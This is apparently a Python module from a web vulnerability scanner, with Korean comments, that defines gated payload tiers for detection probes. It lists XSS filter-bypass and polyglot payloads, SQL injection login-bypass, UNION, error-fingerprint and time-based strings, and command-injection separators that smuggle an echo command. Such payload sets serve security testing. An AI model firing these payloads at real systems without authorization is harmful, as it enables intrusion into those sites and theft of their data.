"""
probes/utils/payloads.py — payload 정책(safe/balanced/aggressive) + 파일 로드 + 개수 상한.

원칙:
  - safe: 기본 marker/반사/에러 기반.
  - balanced: 인증/실습 환경용 일반 우회·인코딩 payload 포함.
  - aggressive: 고위험 우회 + (옵션) time-based SQLi. ENABLE_ADVANCED_PAYLOADS=true 필요. 자동 활성 금지.
  - 외부통신/쿠키탈취/blind callback/파괴적 payload 금지. time-based 는 기본 비활성·엄격 제한.
"""
from __future__ import annotations

import os

XSS_MARKER = "EOSEUREUM_XSS"
CMDI_MARKER = "EOSEUREUM_CMD_TEST"

# ── XSS ─────────────────────────────────────────────────────────────────────
# 모든 XSS payload 는 alert/confirm 마커 실행 '탐지'용 — 쿠키 탈취/외부 유출/파괴 없음.
_XSS_SAFE = [
    "eoseureum_xss_test",
    f"<svg onload=alert('{XSS_MARKER}')>",
    f"\"><svg onload=alert('{XSS_MARKER}')>",
    f"<img src=x onerror=alert('{XSS_MARKER}')>",
    f"'><script>alert('{XSS_MARKER}')</script>",
]
_XSS_BALANCED = _XSS_SAFE + [
    # 태그 탈출 + 다양한 이벤트 핸들러(필터 우회 폭 확대)
    f"'\"><img src=x onerror=alert('{XSS_MARKER}')>",
    f"</script><svg onload=alert('{XSS_MARKER}')>",
    f"<details open ontoggle=alert('{XSS_MARKER}')>",
    f"<body onload=alert('{XSS_MARKER}')>",
    f"<input autofocus onfocus=alert('{XSS_MARKER}')>",
    f"<select autofocus onfocus=alert('{XSS_MARKER}')>",
    f"<textarea autofocus onfocus=alert('{XSS_MARKER}')>",
    f"<video><source onerror=alert('{XSS_MARKER}')>",
    f"<audio src=x onerror=alert('{XSS_MARKER}')>",
    f"<marquee onstart=alert('{XSS_MARKER}')>",
    f"<iframe src=javascript:alert('{XSS_MARKER}')>",
    # 속성 컨텍스트 탈출
    f"\" autofocus onfocus=alert('{XSS_MARKER}') x=\"",
    f"' autofocus onfocus=alert('{XSS_MARKER}') x='",
    # JS(스크립트) 컨텍스트 탈출
    f"';alert('{XSS_MARKER}');//",
    f"\\';alert('{XSS_MARKER}');//",
    f"</script><script>alert('{XSS_MARKER}')</script>",
    # 대소문자/인코딩 우회
    f"<sVg/oNloAd=alert('{XSS_MARKER}')>",
    f"%3Csvg%20onload%3Dalert('{XSS_MARKER}')%3E",
    f"&lt;svg onload=alert('{XSS_MARKER}')&gt;",
    # mXSS / 폴리글롯
    f"<math><mtext></form><form><mglyph><svg><mtext><script>alert('{XSS_MARKER}')</script>",
    (f"jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert('{XSS_MARKER}') )//"
     f"</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert('{XSS_MARKER}')//>"),
]
# aggressive: SVG/포스터/CSP-완화 컨텍스트 등 이색 우회(여전히 alert 마커 실행 탐지만)
_XSS_AGGRESSIVE = _XSS_BALANCED + [
    f"<svg><animate onbegin=alert('{XSS_MARKER}') attributeName=x dur=1s>",
    f"<svg><set attributeName=onload value=alert('{XSS_MARKER}')>",
    f"<object data=javascript:alert('{XSS_MARKER}')>",
    f"<form><button formaction=javascript:alert('{XSS_MARKER}')>x",
    f"<a href=javascript:alert('{XSS_MARKER}')>x</a>",
    f"<img src=x:alert onerror=eval(src.slice(2)+\"('{XSS_MARKER}')\")>",
    f"<svg onload=alert&#40;'{XSS_MARKER}'&#41;>",
    f"<xss id=x tabindex=1 onactivate=alert('{XSS_MARKER}')></xss>",
]

# ── SQLi (login auth-bypass / generic) ──────────────────────────────────────
# 모두 boolean/error/union '탐지'용 — 데이터 덤프/스택쿼리/DROP/파일 I/O 없음.
_SQLI_SAFE = ["' OR '1'='1", "' OR '1'='1' --", "admin' --", '" OR "1"="1']
_SQLI_BALANCED = _SQLI_SAFE + [
    "' OR 'a'='a' --",
    "') OR ('1'='1",
    "' OR 1=1/*",
    "'/**/OR/**/'1'='1",
    "%27%20OR%20%271%27%3D%271",
    # 인증 우회 변형(주석/따옴표/괄호/공백 우회 폭 확대)
    "' OR '1'='1' #",
    "admin' #",
    'admin") --',
    "') OR 1=1 LIMIT 1 -- -",
    "' OR TRUE -- -",
    "' OR '1'='1' /*",
    "1' OR '1'='1",
    "'/**/OR/**/1=1-- -",
    "%27%20OR%201%3D1--%20-",
]
# 에러/불리언/UNION 기반 일반 SQLi 탐지 셋(비파괴 — 존재/구조 확인용)
_SQLI_GENERIC = [
    # 에러 유발
    "'", "\"", "\\", "')", "';", "'\"", "`", "%27",
    # 불리언(참/거짓 응답 차이 비교)
    "' AND '1'='1", "' AND '1'='2",
    "1 AND 1=1", "1 AND 1=2",
    "' AND '1'='1' -- -", "' AND '1'='2' -- -",
    # UNION 컬럼 수 탐색 / ORDER BY
    "1' ORDER BY 1-- -", "1' ORDER BY 5-- -", "1' ORDER BY 10-- -",
    "' UNION SELECT NULL-- -", "' UNION SELECT NULL,NULL-- -",
    "' UNION SELECT NULL,NULL,NULL-- -",
]
# aggressive: 에러 기반 DB 지문(버전 반사) — 고위험(정보노출)이라 ADVANCED 게이트 뒤에서만.
_SQLI_ERROR_FINGERPRINT = [
    "' AND extractvalue(1,concat(0x7e,version()))-- -",          # MySQL
    "' AND updatexml(1,concat(0x7e,version()),1)-- -",           # MySQL
    "' AND 1=CONVERT(int,@@version)-- -",                        # MSSQL
    "' AND 1=CAST(version() AS int)-- -",                        # PostgreSQL
    "' AND 1=(SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
]

# time-based SQLi (기본 비활성. delay 는 호출부에서 cfg.max_time_based_sqli_delay 로 치환)
_SQLI_TIME_TEMPLATES = [
    "' OR SLEEP({d})--",
    "'; WAITFOR DELAY '0:0:{d}'--",
    "' OR pg_sleep({d})--",
    "' AND BENCHMARK({n},MD5('x'))--",
    "' RLIKE SLEEP({d})-- -",
    "' AND (SELECT {d} FROM PG_SLEEP({d}))-- -",
]

# ── CMDi (echo marker 기반만. sleep/ping/외부통신/파괴 절대 금지) ──────────────
_CMDI_SAFE = [f";echo {CMDI_MARKER}"]
_CMDI_BALANCED = [
    f";echo {CMDI_MARKER}",
    f"&& echo {CMDI_MARKER}",
    f"| echo {CMDI_MARKER}",
    f"`echo {CMDI_MARKER}`",
    f"$(echo {CMDI_MARKER})",
    f"|| echo {CMDI_MARKER}",
    # 개행/인코딩/따옴표 우회(여전히 echo 마커만)
    f"%0aecho {CMDI_MARKER}",
    f"\necho {CMDI_MARKER}",
    f"; echo {CMDI_MARKER} ;",
    f"\"; echo {CMDI_MARKER}; \"",
    f"' ; echo {CMDI_MARKER} ; '",
    f"%26%26 echo {CMDI_MARKER}",
]


def _load_file(path: str, limit: int) -> list[str]:
    """payload 파일 로드(한 줄당 1 payload). 최대 limit 개까지만."""
    if not path or limit <= 0 or not os.path.isfile(path):
        return []
    out: list[str] = []
    try:
        with open(path, encoding="utf-8", errors="ignore") as f:
            for line in f:
                s = line.rstrip("\n")
                if not s or s.startswith("#"):
                    continue
                out.append(s)
                if len(out) >= limit:
                    break
    except Exception:
        return []
    return out


def get_xss_payloads(config=None) -> list[str]:
    """payload_level + 파일 + 상한(MAX_XSS_PAYLOADS≤1000) 반영."""
    level = getattr(config, "payload_level", "safe")
    limit = int(getattr(config, "max_xss_payloads", 1000) or 1000)
    if level == "aggressive":
        base = _XSS_AGGRESSIVE
    elif level == "balanced":
        base = _XSS_BALANCED
    else:
        base = _XSS_SAFE
    # aggressive + 확장 옵션일 때만 외부 payload 파일 사용
    extra = []
    if getattr(config, "enable_extended_xss", False) or level == "aggressive":
        extra = _load_file(getattr(config, "xss_payload_file", ""), limit)
    out = list(dict.fromkeys(base + extra))   # 중복 제거, 순서 유지
    return out[:limit]


def get_sqli_login_payloads(config=None) -> list[str]:
    """로그인 폼 인증 우회 payload (level 별)."""
    level = getattr(config, "payload_level", "safe")
    limit = int(getattr(config, "max_sqli_payloads", 1000) or 1000)
    base = _SQLI_BALANCED if level in ("balanced", "aggressive") else _SQLI_SAFE
    extra = []
    if level == "aggressive" and getattr(config, "enable_advanced_payloads", False):
        extra = _load_file(getattr(config, "sqli_payload_file", ""), limit)
    out = list(dict.fromkeys(base + extra))
    return out[:limit]


def get_sqli_generic_payloads(config=None) -> list[str]:
    limit = int(getattr(config, "max_sqli_payloads", 1000) or 1000)
    base = list(_SQLI_GENERIC)
    # 에러 기반 DB 지문(버전 반사)은 정보노출이라 aggressive + ADVANCED 게이트에서만 추가.
    if (getattr(config, "payload_level", "safe") == "aggressive"
            and getattr(config, "enable_advanced_payloads", False)):
        base = base + _SQLI_ERROR_FINGERPRINT
    return list(dict.fromkeys(base))[:limit]


def get_time_based_sqli_payloads(config=None) -> list[str]:
    """time-based SQLi payload. ENABLE_TIME_BASED_SQLI=true + aggressive + ADVANCED 일 때만 비어있지 않음.
    delay 는 MAX_TIME_BASED_SQLI_DELAY(≤3) 로 고정."""
    if not getattr(config, "enable_time_based_sqli", False):
        return []
    if getattr(config, "payload_level", "safe") != "aggressive":
        return []
    if not getattr(config, "enable_advanced_payloads", False):
        return []
    d = int(getattr(config, "max_time_based_sqli_delay", 3) or 3)
    d = max(1, min(d, 3))
    return [t.format(d=d, n=200000) for t in _SQLI_TIME_TEMPLATES]


def get_cmdi_payloads(config=None) -> list[str]:
    level = getattr(config, "payload_level", "safe")
    limit = int(getattr(config, "max_cmdi_payloads", 200) or 200)
    base = _CMDI_BALANCED if level in ("balanced", "aggressive") else _CMDI_SAFE
    extra = []
    if level == "aggressive" and getattr(config, "enable_advanced_payloads", False):
        extra = _load_file(getattr(config, "cmdi_payload_file", ""), limit)
    out = list(dict.fromkeys(base + extra))
    return out[:limit]
